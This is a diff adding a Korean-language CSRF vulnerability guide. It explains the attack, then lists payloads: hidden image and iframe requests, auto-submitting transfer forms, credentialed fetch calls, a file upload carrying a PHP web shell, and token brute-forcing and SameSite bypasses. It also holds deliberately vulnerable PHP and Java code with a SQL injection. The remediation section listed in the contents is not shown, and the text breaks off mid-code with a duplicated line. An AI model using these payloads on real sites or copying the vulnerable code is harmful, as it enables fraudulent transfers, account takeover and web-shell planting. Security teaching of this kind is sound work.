@@ -1,3 +1,346 @@
+# CSRF 취약점 가이드
+
+## 목차
+1. [정의&원리](#1-정의원리)
+2. [기본 페이로드](#2-기본-페이로드)
+3. [특수 페이로드](#3-특수-페이로드)
+4. [조치 가이드](#4-조치-가이드)
+
+---
+
+## 1. 정의&원리
+
+### CSRF(Cross-Site Request Forgery)란?
+사용자가 자신의 의지와는 무관하게 공격자가 의도한 행위(수정, 삭제, 등록 등)를 특정 웹사이트에 요청하게 하는 공격입니다. 사용자가 로그인한 상태에서 공격자가 조작한 링크나 폼을 통해 의도하지 않은 작업을 수행하게 됩니다.
+
+### CSRF 공격 조건
+1. **사용자 인증 상태**: 피해자가 대상 사이트에 로그인되어 있어야 함
+2. **예측 가능한 요청**: 공격자가 요청 구조를 알 수 있어야 함
+3. **토큰 미사용**: CSRF 토큰 등 보호 메커니즘이 없어야 함
+
+### CSRF 공격 유형
+
+#### 1.1. GET 기반 CSRF
+- URL 파라미터를 통한 상태 변경
+- 이미지 태그, 링크 등을 통한 자동 요청
+- 이메일, 게시판 등에 악성 링크 삽입
+
+#### 1.2. POST 기반 CSRF
+- 숨겨진 폼을 통한 POST 요청
+- JavaScript를 이용한 자동 폼 제출
+- AJAX 요청을 통한 백그라운드 공격
+
+#### 1.3. JSON/API 기반 CSRF
+- REST API 엔드포인트 공격
+- Content-Type 조작을 통한 우회
+- CORS 정책 미흡 시 발생
+
+### 공격 시나리오
+
+#### 일반적인 CSRF 공격 시나리오:
+1. **정찰**: 대상 사이트의 중요 기능 파악 (계정 변경, 송금 등)
+2. **요청 분석**: HTTP 요청 구조 분석 및 필수 파라미터 확인
+3. **페이로드 생성**: 악성 HTML/JavaScript 코드 작성
+4. **유포**: 이메일, 게시판, 악성 사이트 등을 통해 배포
+5. **실행**: 피해자가 링크 클릭 시 자동으로 공격 실행
+
+### 일반적인 취약한 코드 패턴
+
+#### 취약한 계정 정보 변경 (PHP):
+```php
+// 토큰 검증 없이 POST 요청만으로 계정 정보 변경
+if ($_POST['action'] == 'change_password') {
+    $new_password = $_POST['new_password'];
+    $user_id = $_SESSION['user_id'];
+    
+    $query = "UPDATE users SET password = '$new_password' WHERE id = $user_id";
+    mysql_query($query);
+    echo "Password changed successfully";
+}
+```
+
+#### 취약한 송금 기능 (Java):
+```java
+@PostMapping("/transfer")
+public String transferMoney(@RequestParam int toAccount, 
+                          @RequestParam double amount, 
+                          HttpSession session) {
+    int fromAccount = (Integer) session.getAttribute("userId");
+    
+    // CSRF 토큰 검증 없이 바로 실행
+    bankService.transfer(fromAccount, toAccount, amount);
+    return "Transfer completed";
+}
+```
+
+---
+
+## 2. 기본 페이로드
+
+### 2.1. GET 기반 CSRF 공격
+
+#### 2.1.1. 이미지 태그를 이용한 공격
+```html
+<!-- 계정 삭제 -->
+<img src="http://target.com/delete_account?confirm=yes" width="0" height="0">
+
+<!-- 비밀번호 변경 -->
+<img src="http://target.com/change_password?new_password=hacked123" style="display:none">
+
+<!-- 관리자 계정 생성 -->
+<img src="http://target.com/admin/create_user?username=attacker&password=pass123&role=admin" hidden>
+
+<!-- 설정 변경 -->
+<img src="http://target.com/settings?email=attacker@evil.com&notifications=off">
+```
+
+#### 2.1.2. 링크를 이용한 공격
+```html
+<!-- 사용자 클릭 유도 -->
+<a href="http://target.com/transfer?to=attacker&amount=1000">
+    무료 상품 받기! 클릭하세요!
+</a>
+
+<!-- 자동 리다이렉트 -->
+<script>
+    window.location.href = "http://target.com/logout";
+</script>
+
+<!-- iframe을 이용한 숨김 공격 -->
+<iframe src="http://target.com/delete_post?id=123" width="0" height="0" style="display:none"></iframe>
+```
+
+#### 2.1.3. 메타 태그를 이용한 자동 리다이렉트
+```html
+<meta http-equiv="refresh" content="0; url=http://target.com/dangerous_action?confirm=yes">
+```
+
+### 2.2. POST 기반 CSRF 공격
+
+#### 2.2.1. 자동 폼 제출
+```html
+<!-- 기본 자동 제출 폼 -->
+<form name="csrf_form" action="http://target.com/change_email" method="POST">
+    <input type="hidden" name="email" value="attacker@evil.com">
+    <input type="hidden" name="confirm" value="yes">
+</form>
+<script>
+    document.csrf_form.submit();
+</script>
+
+<!-- 사용자 상호작용 후 제출 -->
+<form id="hidden_form" action="http://target.com/transfer_money" method="POST">
+    <input type="hidden" name="to_account" value="attacker_account">
+    <input type="hidden" name="amount" value="10000">
+</form>
+<button onclick="document.getElementById('hidden_form').submit()">
+    무료 쿠폰 받기!
+</button>
+```
+
+#### 2.2.2. AJAX를 이용한 백그라운드 공격
+```javascript
+// XMLHttpRequest를 이용한 POST 요청
+function csrfAttack() {
+    var xhr = new XMLHttpRequest();
+    xhr.open('POST', 'http://target.com/api/delete_account', true);
+    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+    xhr.send('confirm=yes&reason=user_request');
+}
+
+// Fetch API를 이용한 공격
+fetch('http://target.com/api/change_role', {
+    method: 'POST',
+    headers: {
+        'Content-Type': 'application/json',
+    },
+    body: JSON.stringify({
+        user_id: 123,
+        new_role: 'admin'
+    }),
+    credentials: 'include'  // 쿠키 포함
+});
+
+// jQuery를 이용한 공격
+$.post('http://target.com/update_profile', {
+    username: 'attacker',
+    email: 'attacker@evil.com',
+    role: 'admin'
+});
+```
+
+### 2.3. 파일 업로드 CSRF
+
+#### 2.3.1. multipart/form-data 폼
+```html
+<form action="http://target.com/upload" method="POST" enctype="multipart/form-data">
+    <input type="hidden" name="file" value="malicious_file.php">
+    <input type="hidden" name="description" value="Legitimate file">
+    <input type="file" name="upload_file" style="display:none">
+</form>
+
+<script>
+// 가짜 파일 데이터 생성
+var form = document.querySelector('form');
+var fileInput = document.querySelector('input[type="file"]');
+
+// Blob을 이용한 가짜 파일 생성
+var maliciousContent = '<?php system($_GET["cmd"]); ?>';
+var blob = new Blob([maliciousContent], {type: 'text/plain'});
+var file = new File([blob], 'shell.php', {type: 'text/plain'});
+
+// DataTransfer를 이용해 파일 할당
+var dataTransfer = new DataTransfer();
+dataTransfer.items.add(file);
+fileInput.files = dataTransfer.files;
+
+form.submit();
+</script>
+```
+
+### 2.4. 소셜 엔지니어링 연계 공격
+
+#### 2.4.1. 이메일을 통한 공격
+```html
+<!-- HTML 이메일 내용 -->
+<p>안녕하세요! 특별 혜택을 위해 아래 링크를 클릭해주세요.</p>
+<a href="http://target.com/subscribe_premium?plan=yearly&auto_renew=true">
+    프리미엄 1년 무료 사용하기
+</a>
+
+<!-- 숨겨진 CSRF 공격 -->
+<img src="http://target.com/api/update_payment?card=1234567890123456&exp=12/25" 
+     style="width:1px;height:1px;display:none">
+```
+
+#### 2.4.2. 게시판을 통한 공격
+```html
+<!-- 게시글에 삽입된 CSRF 코드 -->
+<div>
+    <h3>유용한 정보 공유합니다!</h3>
+    <p>이 내용을 보시는 분들께 도움이 되었으면 합니다.</p>
+    
+    <!-- 보이지 않는 CSRF 공격 -->
+    <iframe src="http://target.com/admin/delete_user?id=victim_id" 
+            width="0" height="0" style="display:none"></iframe>
+</div>
+```
+
+---
+
+## 3. 특수 페이로드
+
+### 3.1. CSRF 토큰 우회 기법
+
+#### 3.1.1. 토큰 추측 및 브루트포스
+```javascript
+// 약한 토큰 생성 알고리즘 공격
+function bruteForceToken() {
+    var possibleTokens = [];
+    
+    // 시간 기반 토큰 추측
+    var currentTime = Date.now();
+    for (var i = -1000; i <= 1000; i++) {
+        var timestamp = currentTime + i;
+        var token = btoa(timestamp.toString()).substr(0, 16);
+        possibleTokens.push(token);
+    }
+    
+    // 각 토큰으로 요청 시도
+    possibleTokens.forEach(function(token) {
+        fetch('http://target.com/api/sensitive_action', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+                'X-CSRF-Token': token
+            },
+            body: JSON.stringify({action: 'malicious'}),
+            credentials: 'include'
+        });
+    });
+}
+```
+
+#### 3.1.2. 토큰 재사용 공격
+```html
+<!-- 동일 세션에서 토큰 재사용 -->
+<form action="http://target.com/transfer" method="POST">
+    <input type="hidden" name="csrf_token" value="[이전에 획득한 유효한 토큰]">
+    <input type="hidden" name="amount" value="10000">
+    <input type="hidden" name="to_account" value="attacker">
+</form>
+<script>document.forms[0].submit();</script>
+```
+
+#### 3.1.3. 토큰 누락 시 기본값 처리 악용
+```javascript
+// 토큰이 없을 때 기본 처리 로직 악용
+fetch('http://target.com/api/action', {
+    method: 'POST',
+    headers: {
+        'Content-Type': 'application/json'
+        // CSRF 토큰 헤더 의도적으로 생략
+    },
+    body: JSON.stringify({
+        action: 'delete_account'
+    }),
+    credentials: 'include'
+});
+```
+
+### 3.2. SameSite 쿠키 우회
+
+#### 3.2.1. 서브도메인을 이용한 우회
+```html
+<!-- target.com의 서브도메인에서 공격 -->
+<!-- 만약 SameSite=Lax인 경우 -->
+<form action="http://target.com/sensitive_action" method="GET">
+    <input type="hidden" name="action" value="malicious">
+</form>
+<script>
+    // GET 요청은 SameSite=Lax에서도 허용됨
+    document.forms[0].submit();
+</script>
+```
+
+#### 3.2.2. 팝업 윈도우를 이용한 우회
+```javascript
+// SameSite=None 쿠키가 있는 경우
+function openAttackWindow() {
+    var attackWindow = window.open('http://target.com/login', 'attack', 'width=1,height=1');
+    
+    setTimeout(function() {
+        // 로그인 후 공격 실행
+        attackWindow.location.href = 'http://target.com/delete_account?confirm=yes';
+    }, 3000);
+}
+
+// 사용자 클릭 유도
+document.body.innerHTML = '<button onclick="openAttackWindow()">특별 혜택 받기!</button>';
+```
+
+### 3.3. Content-Type 우회
+
+#### 3.3.1. Simple Request 악용
+```javascript
+// CORS preflight 없는 요청 타입 사용
+fetch('http://target.com/api/transfer', {
+    method: 'POST',
+    headers: {
+        'Content-Type': 'text/plain'  // Simple request
+    },
+    body: 'to_account=attacker&amount=10000',
+    credentials: 'include'
+});
+
+// application/x-www-form-urlencoded 사용
+fetch('http://target.com/api/action', {
+    method: 'POST',
+    headers: {
+        'Content-Type': 'application/x-www-form-urlencoded'
+    },
+    body: new URLSearchParams({
+
 body: new URLSearchParams({
         'action': 'delete',
         'user_id': '123'
